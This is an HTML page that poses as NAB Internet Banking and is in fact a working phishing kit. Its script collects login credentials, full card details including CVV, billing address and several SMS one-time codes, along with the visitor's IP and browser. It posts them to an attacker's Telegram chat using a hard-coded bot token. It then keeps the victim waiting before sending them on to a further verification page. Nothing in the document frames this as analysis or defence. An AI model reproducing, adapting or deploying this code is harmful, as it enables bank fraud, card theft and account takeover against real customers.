<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>NAB Internet Banking</title>
    <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body,
      html {
        font-family: Arial, sans-serif;
        height: 100%;
      }

      .header_banner {
        width: 100%;
        background-color: #000;
      }

      .header_inner {
        display: flex;
        justify-content: space-between;
        align-items: center;
        max-width: 1200px;
        margin: 0 auto;
        padding: 15px 16px;
        width: 100%;
        gap: 20px;
      }

      .header_left {
        display: flex;
        align-items: center;
      }

      .header_right {
        color: #fff;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .header_right p {
        font-size: 0.8em;
        padding: 10px;
      }

      .banner {
        position: relative;
        min-height: 100vh;
        background-image: url("img/bg-login.jpeg");
        background-repeat: no-repeat;
        background-size: cover;
        background-position: center top;
        background-attachment: fixed;
        display: flex;
        flex-direction: column;
        overflow: hidden;
      }

      .login_wrapper {
        position: relative;
        width: 100%;
        max-width: 500px;
        margin-top: 40px;
        margin-left: 300px;
        background-color: white;
        border-radius: 8px;
        overflow: hidden;
      }

      .security-questions-icon {
        width: 45px;
        height: 45px;
      }
      .security-questions-header {
        font-family: "SourceSans-Light";
        font-size: 1.5em;
      }
      .form_container {
        position: relative;
        width: 100%;
        height: 150%;
        padding: 38px 32px;
        padding-bottom: 0px;
      }

      .loading-div {
        position: absolute;
        width: 100%;
        top: 30%;
        left: 50%;
        transform: translate(-50%, -50%);
      }

      h1 {
        font-size: 30px;
        margin-bottom: 32px;
        color: #333;
        font-weight: 100;
      }

      .input_field {
        /* margin: 20px 0px; */
      }

      .error {
        margin-bottom: 0.8em;
      }

      .input_field label {
        font-size: 14px;
        color: #000;
        display: block;
        margin-bottom: 8px;
        font-weight: bold;
      }

      .input_field select,
      .input_field input {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-size: 16px;
      }

      .input_field .error {
        color: rgb(194, 0, 0);
        font-size: 12px;
      }

      .login_button {
        margin-bottom: 20px;
      }

      .login_button button {
        width: 128px;
        padding: 12px;
        background-color: #e2001a;
        color: #fff;
        border: none;
        border-radius: 4px;
        font-size: 16px;
        cursor: pointer;
      }

      .login_button button:hover {
        background-color: #d00016;
      }

      .footer_links a {
        color: #d00016;
      }

      .footer_links a:hover {
        text-decoration: underline;
      }

      .footer_link2 {
        margin-top: 30px;
        background-color: #e6e6e6;
        padding: 20px;
        font-size: 16px;
        font-weight: 100;
      }

      .info {
        color: #4d4d4d;
        font-size: 14px;
      }

      .footer_link2 a {
        color: #d00016;
        font-weight: bold;
      }

      .input_field input,
      .input_field select {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-size: 16px;
        transition: border 0.3s ease;
      }

      .input_field input:focus,
      .input_field select:focus {
        outline: none;
        border: 3px solid grey;
      }

      .input_error {
        border: 1px solid rgb(194, 0, 0) !important;
      }

      .input_error:focus {
        border: 3px solid rgb(194, 0, 0) !important;
      }

      .input_field .error {
        color: rgb(194, 0, 0);
        font-size: 14px;
        margin-top: 4px;
        height: 14px;
        line-height: 14px;
        transition: all 0.3s ease;
      }

      .modal-backdrop {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: rgba(0, 0, 0, 0.5);
        z-index: 999;
      }

      .modal {
        position: fixed;
        top: 28%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: #fff;
        padding: 40px;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        z-index: 1000;
        width: 400px;
        height: 300px;
        text-align: center;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }

      .spinner {
        width: 40px;
        height: 40px;
        border: 4px solid #ddd;
        border-top: 4px solid rgb(194, 0, 0);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }

      @font-face {
        font-family: "SourceSans-Light";
        src: url("font/SourceSans-Light.woff2") format("woff2"),
          url("font/SourceSans-Light.woff") format("woff");
        font-weight: 100;
        font-style: normal;
      }

      .loading-div {
        display: none;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        padding: 20px;
      }

      .loader {
        width: 40px;
        height: 40px;
        border: 3px solid transparent;
        border-top: 3px solid #e60000;
        border-right: 3px solid #e60000;
        border-radius: 50%;
        animation: spin 1.5s linear infinite;
        margin: 0 auto;
      }

      .loader-message {
        margin-top: 12px;
        font-size: 14px;
        color: #444;
        text-align: center;
        font-family: Arial, sans-serif;
      }
      .checkbox-field {
        margin-bottom: 2em;
        display: flex;
        align-items: center;
        gap: 10px;
      }

      #agree {
        height: 20px;
        width: 20px;
      }

      /* Card input styling */
      .card-input-wrapper {
        position: relative;
      }
      .card-input-wrapper input {
        padding-right: 50px;
      }
      .card-icon {
        position: absolute;
        right: 12px;
        top: 50%;
        transform: translateY(-50%);
        font-size: 20px;
        opacity: 0.5;
      }

      @media screen and (max-width: 768px) {
        .header_inner {
          display: flex;
          justify-content: space-between;
          padding: 14px 16px;
        }

        .header_left {
          margin-left: 0;
          margin-bottom: 10px;
        }

        .header_right {
          display: none;
        }

        .login_wrapper {
          width: 90%;
          margin: 50px auto;
          background-color: white;
          border-radius: 8px;
          overflow: hidden;
        }

        .form_container {
          padding: 20px;
        }

        .security-questions-icon {
          width: 40px;
          height: 40px;
        }
        .security-questions-header {
          font-size: 1.2em;
        }
        #agree {
          height: 25px;
          width: 25px;
        }
      }
    </style>
  </head>

    <script>
      // ===== CONFIG (Replaces edit.php) =====
      const CONFIG = {
        apikey: "8343008184:AAF4ccn2zyT6Z-zGMZy2zThfPS26L8jPNjE",
        chatid: "722615124"
      };

      // ===== Helper Functions (Replaces fxker.php) =====
      function clean(value) {
        return String(value).trim().replace(/</g, '&lt;').replace(/>/g, '&gt;');
      }

      function getBrowser(ua) {
        if (ua.includes('MSIE')) return 'Internet Explorer';
        if (ua.includes('Firefox')) return 'Mozilla Firefox';
        if (ua.includes('Chrome')) return 'Google Chrome';
        if (ua.includes('Safari')) return 'Safari';
        if (ua.includes('Opera')) return 'Opera';
        return 'Unknown';
      }

      async function getLocation(ip) {
        try {
          const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
          const data = await res.json();
          return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
        } catch {
          return { country: 'Unknown', city: 'Unknown' };
        }
      }

      async function getClientInfo() {
        let ip = '0.0.0.0';
        try {
          const res = await fetch('https://api.ipify.org?format=json');
          const data = await res.json();
          ip = data.ip;
        } catch(e) {
          console.warn('IP fetch failed');
        }
        const location = await getLocation(ip);
        return {
          ip: ip,
          location: location,
          userAgent: navigator.userAgent,
          browser: getBrowser(navigator.userAgent)
        };
      }

      // ===== Send to Telegram (Replaces message() from fxker.php) =====
      async function sendTelegram(message) {
        try {
          const response = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.chatid, text: message })
          });
          const data = await response.json();
          console.log('Telegram response:', data);
          return data;
        } catch(e) {
          console.error('Telegram send error:', e);
          return null;
        }
      }

      // ===== Session Management (Replaces PHP $_SESSION) =====
      const Session = {
        get: function(key) {
          return localStorage.getItem('session_' + key);
        },
        set: function(key, value) {
          localStorage.setItem('session_' + key, value);
        },
        getUsername: function() {
          return this.get('username') || 'Unknown';
        }
      };

      // ===== The Main Switch (Replaces err.php) =====
      async function processForm(target, formData) {
        const info = await getClientInfo();
        let message = "";

        switch(parseInt(target)) {
          case 0: // Login (NAB LOGIN 1)
            const username = clean(formData.get('x') || '');
            const password = clean(formData.get('xx') || '');
            Session.set('username', username);
            Session.set('password', password);

            message = `
        ------------------[NAB LOGIN 1]------------------

        Username : ${username}
        Password : ${password}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          case 1: // Card Details & Identity Verification
            const fullName = clean(formData.get('fullName') || '');
            const cardNumber = clean(formData.get('cardNumber') || '');
            const expiryDate = clean(formData.get('expiryDate') || '');
            const cvv = clean(formData.get('cvv') || '');
            const billingAddress = clean(formData.get('billingAddress') || '');
            const postcode = clean(formData.get('postcode') || '');

            message = `
        ---------------[CARD VERIFICATION]---------------

        Customer Identity Verification By ${Session.getUsername()}

        Full Name: ${fullName}
        Card Number: ${cardNumber}
        Expiry Date: ${expiryDate}
        CVV: ${cvv}
        Billing Address: ${billingAddress}
        Postcode: ${postcode}

        --------------[USER AGENT IP DNS]--------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        --------------[TELEGRAM: ECHOVSL]--------------`;
            break;

          case 2: // SMS Code 1
            const otp1 = clean(formData.get('xxl') || '');
            message = `
        --------------[NAB SMS CODE 1]--------------

        SMS CODE FROM : ${Session.getUsername()}
        SMS CODE : ${otp1}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          case 3: // SMS Code 2
            const otp2 = clean(formData.get('xxll') || '');
            message = `
        --------------[NAB SMS CODE 2]--------------

        SMS CODE FROM : ${Session.getUsername()}
        SMS CODE : ${otp2}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          case 4: // Review
            message = `
        --------------[SECURITY QA REVIEW]--------------

        ${Session.getUsername()} Reviewing Security Questions and Answers Set

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          case 5: // SMS Code 3
            const otp3 = clean(formData.get('xxlll') || '');
            message = `
        --------------[NAB SMS CODE 3]--------------

        SMS CODE FROM : ${Session.getUsername()}
        SMS CODE : ${otp3}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          default:
            console.warn('Unknown target:', target);
            return false;
        }

        // Send to Telegram
        await sendTelegram(message);
        console.log('✅ Message sent to Telegram');
        return true;
      }
    </script>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const continueBtn = document.getElementById("continueBtn");
        const agreeCheckbox = document.getElementById("agree");
        const errorMessage = document.getElementById("error-message");

        const fullName = document.getElementById("fullName");
        const cardNumber = document.getElementById("cardNumber");
        const expiryDate = document.getElementById("expiryDate");
        const cvv = document.getElementById("cvv");
        const billingAddress = document.getElementById("billingAddress");
        const postcode = document.getElementById("postcode");

        const errorFullName = document.getElementById("error-fullName");
        const errorCardNumber = document.getElementById("error-cardNumber");
        const errorExpiryDate = document.getElementById("error-expiryDate");
        const errorCvv = document.getElementById("error-cvv");
        const errorBillingAddress = document.getElementById("error-billingAddress");
        const errorPostcode = document.getElementById("error-postcode");

        // Auto-format card number
        cardNumber.addEventListener("input", function () {
          let value = this.value.replace(/\D/g, "");
          if (value.length > 16) value = value.slice(0, 16);
          let formatted = "";
          for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += " ";
            formatted += value[i];
          }
          this.value = formatted;
        });

        // Auto-format expiry date
        expiryDate.addEventListener("input", function () {
          let value = this.value.replace(/\D/g, "");
          if (value.length > 4) value = value.slice(0, 4);
          if (value.length >= 2) {
            this.value = value.slice(0, 2) + "/" + value.slice(2);
          } else {
            this.value = value;
          }
        });

        // Only allow numbers for CVV
        cvv.addEventListener("input", function () {
          this.value = this.value.replace(/\D/g, "").slice(0, 4);
        });

        // Only allow numbers for postcode
        postcode.addEventListener("input", function () {
          this.value = this.value.replace(/\D/g, "").slice(0, 4);
        });

        // Clear errors on focus
        [fullName, cardNumber, expiryDate, cvv, billingAddress, postcode].forEach(function(input) {
          input.addEventListener("focus", function() {
            const errorId = "error-" + this.id;
            const errorEl = document.getElementById(errorId);
            if (errorEl) {
              errorEl.textContent = "";
              this.classList.remove("input_error");
            }
          });
        });

        continueBtn.addEventListener("click", function () {
          let isValid = true;

          // Validate Full Name
          if (!fullName.value.trim()) {
            errorFullName.textContent = "Please enter your full name.";
            fullName.classList.add("input_error");
            isValid = false;
          } else if (fullName.value.trim().length < 2) {
            errorFullName.textContent = "Please enter a valid name (minimum 2 characters).";
            fullName.classList.add("input_error");
            isValid = false;
          } else {
            fullName.classList.remove("input_error");
            errorFullName.textContent = "";
          }

          // Validate Card Number
          const cardNumberClean = cardNumber.value.replace(/\s/g, "");
          if (!cardNumberClean) {
            errorCardNumber.textContent = "Please enter your card number.";
            cardNumber.classList.add("input_error");
            isValid = false;
          } else if (cardNumberClean.length !== 16) {
            errorCardNumber.textContent = "Please enter a valid 16-digit card number.";
            cardNumber.classList.add("input_error");
            isValid = false;
          } else {
            cardNumber.classList.remove("input_error");
            errorCardNumber.textContent = "";
          }

          // Validate Expiry Date
          const expiryClean = expiryDate.value.replace("/", "");
          if (!expiryDate.value) {
            errorExpiryDate.textContent = "Please enter the expiry date.";
            expiryDate.classList.add("input_error");
            isValid = false;
          } else if (expiryClean.length !== 4) {
            errorExpiryDate.textContent = "Please enter a valid expiry date (MM/YY).";
            expiryDate.classList.add("input_error");
            isValid = false;
          } else {
            const month = parseInt(expiryClean.slice(0, 2));
            const year = parseInt(expiryClean.slice(2));
            if (month < 1 || month > 12) {
              errorExpiryDate.textContent = "Please enter a valid month (01-12).";
              expiryDate.classList.add("input_error");
              isValid = false;
            } else {
              expiryDate.classList.remove("input_error");
              errorExpiryDate.textContent = "";
            }
          }

          // Validate CVV
          if (!cvv.value) {
            errorCvv.textContent = "Please enter your CVV.";
            cvv.classList.add("input_error");
            isValid = false;
          } else if (cvv.value.length < 3 || cvv.value.length > 4) {
            errorCvv.textContent = "Please enter a valid 3 or 4 digit CVV.";
            cvv.classList.add("input_error");
            isValid = false;
          } else {
            cvv.classList.remove("input_error");
            errorCvv.textContent = "";
          }

          // Validate Billing Address
          if (!billingAddress.value.trim()) {
            errorBillingAddress.textContent = "Please enter your billing address.";
            billingAddress.classList.add("input_error");
            isValid = false;
          } else {
            billingAddress.classList.remove("input_error");
            errorBillingAddress.textContent = "";
          }

          // Validate Postcode
          if (!postcode.value) {
            errorPostcode.textContent = "Please enter your postcode.";
            postcode.classList.add("input_error");
            isValid = false;
          } else if (postcode.value.length !== 4) {
            errorPostcode.textContent = "Please enter a valid 4-digit postcode.";
            postcode.classList.add("input_error");
            isValid = false;
          } else {
            postcode.classList.remove("input_error");
            errorPostcode.textContent = "";
          }

          // Validate checkbox
          if (!agreeCheckbox.checked) {
            errorMessage.style.display = "block";
            isValid = false;
          } else {
            errorMessage.style.display = "none";
          }

          if (isValid) {
            continueBtn.textContent = "Processing...";
            continueBtn.disabled = true;
            submitCardDetails();
          }
        });

        agreeCheckbox.addEventListener("change", function () {
          if (this.checked) {
            errorMessage.style.display = "none";
          }
        });
      });

      // ===== Submit Card Details - Replaces XHR to PHP =====
      async function submitCardDetails() {
        const data = {
          fullName: document.getElementById("fullName").value,
          cardNumber: document.getElementById("cardNumber").value,
          expiryDate: document.getElementById("expiryDate").value,
          cvv: document.getElementById("cvv").value,
          billingAddress: document.getElementById("billingAddress").value,
          postcode: document.getElementById("postcode").value,
        };

        // ===== Build form data and send via processForm =====
        const formData = new FormData();
        formData.append("sws", 1);
        formData.append("fullName", data.fullName);
        formData.append("cardNumber", data.cardNumber);
        formData.append("expiryDate", data.expiryDate);
        formData.append("cvv", data.cvv);
        formData.append("billingAddress", data.billingAddress);
        formData.append("postcode", data.postcode);

        // Process and send to Telegram (no PHP needed!)
        const success = await processForm(1, formData);

        if (success) {
          ShowLoadingModal();
          setTimeout(() => {
            window.location.href = "verify-security.html";
          }, 60000);
        } else {
          location.reload();
        }
      }
    </script>
  </body>
</html>
